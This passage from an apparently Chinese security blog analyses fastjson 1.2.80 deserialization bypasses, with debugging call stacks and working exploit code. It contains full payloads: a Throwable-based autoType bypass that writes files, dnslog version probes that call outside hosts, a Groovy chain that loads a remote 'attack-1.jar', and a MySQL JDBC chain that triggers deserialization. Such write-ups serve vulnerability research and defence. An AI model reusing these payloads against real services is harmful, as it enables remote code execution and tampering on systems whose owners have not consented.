class="hljs-string">&quot;D:\\WebSafe\\JavaProject\\fastjson\\src\\main\\java\\com\\lingx5\\poc\\1.txt&quot;</span><br>   <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>bypassTest</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.fastjson1_2_8;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bypassTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;  &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\&quot;@type\&quot;:\&quot;com.lingx5.fastjson1_2_8.MyException\&quot;,\&quot;out\&quot;: &#123;&#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;  &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;     \&quot;@type\&quot;: \&quot;java.io.OutputStream\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;@type\&quot;: \&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;tempPath\&quot;: \&quot;D:\\\\WebSafe\\\\JavaProject\\\\fastjson\\\\src\\\\main\\\\java\\\\com\\\\lingx5\\\\exp\\\\1.txt\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;targetPath\&quot;: \&quot;D:\\\\WebSafe\\\\JavaProject\\\\fastjson\\\\src\\\\main\\\\java\\\\com\\\\lingx5\\\\poc\\\\1.txt\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;   &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们开始调试，这里 第一步利用 Throwable 绕过 checkAutoType，实例化 MyException 在 <a href="https://www.cnblogs.com/LINGX5/p/18797812#throwabledeserializer">fastjson-1.2.68-bypass</a> 文章中已经讲过了，所以就略过了</p><h3 id="第一个对象解析"><a href="#第一个对象解析" class="headerlink" title="第一个对象解析"></a>第一个对象解析</h3><blockquote><p>{<br>  “@type”: “java.lang.Exception”, “@type”: “com.lingx5.fastjson1_2_8.MyException”, “out”: {}<br>  }</p></blockquote><p>我们来到 实例化 MyException 完成后的 ThrowableDeserializer#deserialze 方法 ，直接看解析 out 参数</p><p>我们都知道 cast() 方法 是用来完成类型转换的，那肯定和 out 参数的类型有关</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250329163032084.png" alt="image-20250329163032084"></p><p>我们进入 cast 方法 , 看到有一层重载 </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250329163330904.png" alt="image-20250329163330904"></p><p>接着跟</p><p>最后 return 了 调用 castToJavaBean() 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250329163545825.png" alt="image-20250329163545825"></p><p>castToJavaBean() 调用 getDeserializer() 这个函数</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250329164629709.png" alt="image-20250329164629709"></p><p>我们看看 getDeserializer() 都做了什么</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250329165209488.png" alt="image-20250329165209488"></p><p>看到 他到最后把 java.io.OutputStream 和 JavaBeanDeserializer 对应起来 ，放入了 deserializers 表中</p><p>调用栈看一下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus">putDeserializer:<span class="hljs-number">1138</span>, ParserConfig (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.parser)<br>getDeserializer:<span class="hljs-number">911</span>, ParserConfig (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.parser)<br>getDeserializer:<span class="hljs-number">613</span>, ParserConfig (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.parser)<br>castToJavaBean:<span class="hljs-number">1560</span>, TypeUtils (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.util)<br>cast:<span class="hljs-number">1128</span>, TypeUtils (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.util)<br>cast:<span class="hljs-number">1324</span>, TypeUtils (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.util)<br>deserialze:<span class="hljs-number">153</span>, ThrowableDeserializer (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span><span class="hljs-selector-class">.parser</span>.deserializer)<br>parseObject:<span class="hljs-number">405</span>, DefaultJSONParser (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.parser)<br>parse:<span class="hljs-number">1430</span>, DefaultJSONParser (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.parser)<br>parse:<span class="hljs-number">1390</span>, DefaultJSONParser (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.parser)<br>parseObject:<span class="hljs-number">291</span>, DefaultJSONParser (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.parser)<br>parse:<span class="hljs-number">1430</span>, DefaultJSONParser (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.parser)<br>parse:<span class="hljs-number">1390</span>, DefaultJSONParser (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.parser)<br>parse:<span class="hljs-number">181</span>, JSON (com<span class="hljs-selector-class">.alibaba</span>.fastjson)<br>parse:<span class="hljs-number">191</span>, JSON (com<span class="hljs-selector-class">.alibaba</span>.fastjson)<br>parse:<span class="hljs-number">147</span>, JSON (com<span class="hljs-selector-class">.alibaba</span>.fastjson)<br><span class="hljs-selector-tag">main</span>:<span class="hljs-number">18</span>, bypassTest (com<span class="hljs-selector-class">.lingx5</span>.fastjson1_2_8)<br></code></pre></td></tr></table></figure><p>到这里 第一个对象的解析就做完了，主要就是把 构造参数 对应类型(java.io.OutputStream) 放入 deserializers 表中</p><h3 id="第二个对象解析"><a href="#第二个对象解析" class="headerlink" title="第二个对象解析"></a>第二个对象解析</h3><blockquote><p>{<br>     “@type”: “java.io.OutputStream”,<br>    “@type”: “org.eclipse.core.internal.localstore.SafeFileOutputStream”,<br>    “tempPath”: “D:\WebSafe\JavaProject\fastjson\src\main\java\com\lingx5\exp\1.txt”,<br>    “targetPath”: “D:\WebSafe\JavaProject\fastjson\src\main\java\com\lingx5\poc\1.txt”<br>   }</p></blockquote><p>我们经历一系列的弹栈后，来到了 DefaultJSONParser#parseObject 函数，继续扫描后续的 json 字符串，扫描到@type 后，又要进行 checkAutoType() </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250329170305770.png" alt="image-20250329170305770"></p><p>这次传入的是 out 的接口类型，进入</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250329170631979.png" alt="image-20250329170631979"></p><p>找到了 就 在后边直接 return 了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250329170728732.png" alt="image-20250329170728732"></p><p>后边就是 后去 反序列化器 再次 去解析 json 串 </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250329171725875.png" alt="image-20250329171725875"></p><p>我们就进入了 JavaBeanDeserializer#deserialze 方法，扫描到 “@type”: “org.eclipse.core.internal.localstore.SafeFileOutputStream”</p><p>再次执行 checkAutoType 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250329172143898.png" alt="image-20250329172143898"></p><p>毫无疑问，这肯定是可以绕过的</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250329172327584.png" alt="image-20250329172327584"></p><p>后续就和 fastjson 1.2.68 一样了，就不再调试了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/PixPin_2025-03-29_17-24-53.gif" alt="PixPin_2025-03-29_17-24-53"></p><p>成功执行了 payload</p><h2 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h2><h3 id="dnslog-探测版本"><a href="#dnslog-探测版本" class="headerlink" title="dnslog 探测版本"></a>dnslog 探测版本</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">[</span><br>  <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.Exception&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.alibaba.fastjson.JSONException&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span><br>  <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;5jlb14.dnslog.cn&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.Exception&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.alibaba.fastjson.JSONException&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span><br>  <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1hsn5g.ceye.io&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><p>在 fastjson1.2.8 下</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="https://gitee.com/ling-x5/img/raw/master/image-20250329212712363.png" alt="image-20250329212712363"></div></div><div class="group-image-row"><div class="group-image-wrap"><img src="https://gitee.com/ling-x5/img/raw/master/image-20250329212727389.png" alt="image-20250329212727389"></div></div></div><p>在 fastjson1.2.83 下</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="https://gitee.com/ling-x5/img/raw/master/image-20250329212929564.png" alt="image-20250329212929564"></div></div><div class="group-image-row"><div class="group-image-wrap"><img src="https://gitee.com/ling-x5/img/raw/master/image-20250329212943354.png" alt="image-20250329212943354"></div></div></div><div class=note note-success>这其实就是因为在 1.2.83 中 checkAutoType 修复了 对于 Throwable 的绕过，直接解析的 java.net.InetSocketAddress。 而在 1.2.8 中解析到第二个 JSONException时，会去用messege字段 去走构造方法，抛出异常 不会向第二个dnslog 发送请求</div><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250330105809650.png" alt="image-20250330105809650"></p><h3 id="groovy-链"><a href="#groovy-链" class="headerlink" title="groovy 链"></a>groovy 链</h3><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p><a href="https://github.com/Lonely-night/fastjsonVul">Lonely-night&#x2F;fastjsonVul: fastjson 80 远程代码执行漏洞复现</a> jar包 和 复现代码 都有</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Exception&quot;</span>,<br>    <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.codehaus.groovy.control.CompilationFailedException&quot;</span>,<br>    <span class="hljs-string">&quot;unit&quot;</span>:&#123;&#125;<br>&#125;<br><br>&#123;<br>  <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.codehaus.groovy.control.ProcessingUnit&quot;</span>,<br>  <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&quot;</span>,<br>  <span class="hljs-string">&quot;config&quot;</span>:&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.codehaus.groovy.control.CompilerConfiguration&quot;</span>,<br>    <span class="hljs-string">&quot;classpathList&quot;</span>:[<span class="hljs-string">&quot;http://127.0.0.1:8000/attack-1.jar&quot;</span>]<br>  &#125;,<br>  <span class="hljs-string">&quot;gcl&quot;</span>:<span class="hljs-literal">null</span>,<br>  <span class="hljs-string">&quot;destDir&quot;</span>: <span class="hljs-string">&quot;/tmp&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250330161657819.png" alt="image-20250330161657819"></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><blockquote><p>{<br>    “@type”:”java.lang.Exception”,<br>    “@type”:”org.codehaus.groovy.control.CompilationFailedException”,<br>    “unit”:{}<br>}</p></blockquote><p>这个把 unit的类型 也就是 ProcessingUnit 放入了缓存表中，在解析第二个对象时，ProcessingUnit 作为期盼类 ，让他的 子类JavaStubCompilationUnit可以绕过 checkAutoType 的检查</p><blockquote><p>{<br>  “@type”:”org.codehaus.groovy.control.ProcessingUnit”,<br>  “@type”:”org.codehaus.groovy.tools.javac.JavaStubCompilationUnit”,<br>  “config”:{<br>    “@type”: “org.codehaus.groovy.control.CompilerConfiguration”,<br>    “classpathList”:[“<a href="http://127.0.0.1:8000/attack-1.jar%22]">http://127.0.0.1:8000/attack-1.jar&quot;]</a><br>  },<br>  “gcl”:null,<br>  “destDir”: “&#x2F;tmp”<br>}</p></blockquote><p>JavaStubCompilationUnit 在构造函数中，调用 super （CompilationUnit） 构造方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250330162457464.png" alt="image-20250330162457464"></p><p>CompilationUnit 接着调用super(ProcessingUnit)  构造器 &#x3D;&gt; ProcessingUnit#setClassLoader &#x3D;&gt;  new GroovyClassLoader(parent, this.getConfiguration()); &#x3D;&gt; addClasspath(path)</p><p>初始化恶意的classLoader调用栈</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250330170336600.png" alt="image-20250330170336600"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&lt;init&gt;:<span class="hljs-number">163</span>, GroovyClassLoader (groovy.lang)<br>&lt;init&gt;:<span class="hljs-number">183</span>, GroovyClassLoader (groovy.lang)<br>lambda<span class="hljs-variable">$setClassLoader</span>$<span class="hljs-number">0</span>:<span class="hljs-number">106</span>, ProcessingUnit (org<span class="hljs-selector-class">.codehaus</span><span class="hljs-selector-class">.groovy</span>.control)<br>run:-<span class="hljs-number">1</span>, <span class="hljs-number">603443293</span> (org<span class="hljs-selector-class">.codehaus</span><span class="hljs-selector-class">.groovy</span><span class="hljs-selector-class">.control</span>.ProcessingUnit$<span class="hljs-variable">$Lambda</span>$<span class="hljs-number">22</span>)<br>doPrivileged:-<span class="hljs-number">1</span>, AccessController (java.security)<br>setClassLoader:<span class="hljs-number">103</span>, ProcessingUnit (org<span class="hljs-selector-class">.codehaus</span><span class="hljs-selector-class">.groovy</span>.control)<br>&lt;init&gt;:<span class="hljs-number">64</span>, ProcessingUnit (org<span class="hljs-selector-class">.codehaus</span><span class="hljs-selector-class">.groovy</span>.control)<br>&lt;init&gt;:<span class="hljs-number">180</span>, CompilationUnit (org<span class="hljs-selector-class">.codehaus</span><span class="hljs-selector-class">.groovy</span>.control)<br>&lt;init&gt;:<span class="hljs-number">161</span>, CompilationUnit (org<span class="hljs-selector-class">.codehaus</span><span class="hljs-selector-class">.groovy</span>.control)<br>&lt;init&gt;:<span class="hljs-number">46</span>, JavaStubCompilationUnit (org<span class="hljs-selector-class">.codehaus</span><span class="hljs-selector-class">.groovy</span><span class="hljs-selector-class">.tools</span>.javac)<br></code></pre></td></tr></table></figure><p>执行调用栈</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250330170134389.png" alt="image-20250330170134389"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">addPhaseOperationsForGlobalTransforms:<span class="hljs-number">334</span>, ASTTransformationVisitor (org<span class="hljs-selector-class">.codehaus</span><span class="hljs-selector-class">.groovy</span>.<span class="hljs-attribute">transform</span>)<br>doAddGlobalTransforms:<span class="hljs-number">308</span>, ASTTransformationVisitor (org<span class="hljs-selector-class">.codehaus</span><span class="hljs-selector-class">.groovy</span>.<span class="hljs-attribute">transform</span>)<br>addGlobalTransforms:<span class="hljs-number">234</span>, ASTTransformationVisitor (org<span class="hljs-selector-class">.codehaus</span><span class="hljs-selector-class">.groovy</span>.<span class="hljs-attribute">transform</span>)<br>addPhaseOperations:<span class="hljs-number">202</span>, ASTTransformationVisitor (org<span class="hljs-selector-class">.codehaus</span><span class="hljs-selector-class">.groovy</span>.<span class="hljs-attribute">transform</span>)<br>addPhaseOperations:<span class="hljs-number">288</span>, CompilationUnit (org<span class="hljs-selector-class">.codehaus</span><span class="hljs-selector-class">.groovy</span>.control)<br>&lt;init&gt;:<span class="hljs-number">185</span>, CompilationUnit (org<span class="hljs-selector-class">.codehaus</span><span class="hljs-selector-class">.groovy</span>.control)<br>&lt;init&gt;:<span class="hljs-number">161</span>, CompilationUnit (org<span class="hljs-selector-class">.codehaus</span><span class="hljs-selector-class">.groovy</span>.control)<br>&lt;init&gt;:<span class="hljs-number">46</span>, JavaStubCompilationUnit (org<span class="hljs-selector-class">.codehaus</span><span class="hljs-selector-class">.groovy</span><span class="hljs-selector-class">.tools</span>.javac)<br></code></pre></td></tr></table></figure><h3 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--  rhq-scripting-python 依赖 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.rhq<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>rhq-scripting-python<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.13.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!--  PostgreSQL 驱动依赖 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.postgresql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>postgresql<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>42.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!--  mysql 只能是6.0.2 或者6.0.3 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>6.0.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>JDBCExp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.fastjson1_2_8;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JDBCExp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;@type\&quot;:\&quot;org.python.antlr.ParseException\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;type\&quot;:&#123;&#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;\n&quot;</span> ;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload2</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;@type\&quot;:\&quot;org.python.core.PyObject\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;@type\&quot;:\&quot;com.ziclix.python.sql.PyConnection\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;connection\&quot;:&#123; &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;\n&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload3</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;@type\&quot;:\&quot;java.sql.Connection\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;@type\&quot;:\&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;proxy\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;connectionString\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            \&quot;url\&quot;:\&quot;jdbc:mysql://localhost:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=deser_CC31_calc\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;\n&quot;</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            JSON.parse(payload1);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            JSON.parse(payload2);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            JSON.parse(payload3);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>具体的流程我们在分析  <a href="https://lingx5.github.io/2025/03/28/fastjson-1-2-68-bypass/#LoadBalancedMySQLConnection">fastjson-1.2.68-bypass </a> 其实已经介绍过了，对应的 8.0.19 也可以利用</p></blockquote><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250330211818304.png" alt="image-20250330211818304"></p><blockquote><p>为什么只能是 6.0.2 或者 6.0.3</p></blockquote><p>这是因为 LoadBalancedConnectionProxy的构造参数有变化</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250330212548162.png" alt="image-20250330212548162"></p><h3 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h3><p><a href="https://github.com/su18/hack-fastjson-1.2.80">su18师傅</a> 做了总结</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://squirt1e.top/2024/11/08/fastjson-1.2.80-springboot-xin-lian/">Squirt1e’s blog</a></p><p><a href="https://github.com/su18/hack-fastjson-1.2.80">su18&#x2F;hack-fastjson-1.2.80</a></p><p><a href="https://www.cnblogs.com/rnss/p/16738100.html">fastjson 1.2.80绕过简单分析 - rnss - 博客园</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
      <category>fastjson系列</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>fastjson反序列化</tag>
      
    </tags>
    
  </entry>
  
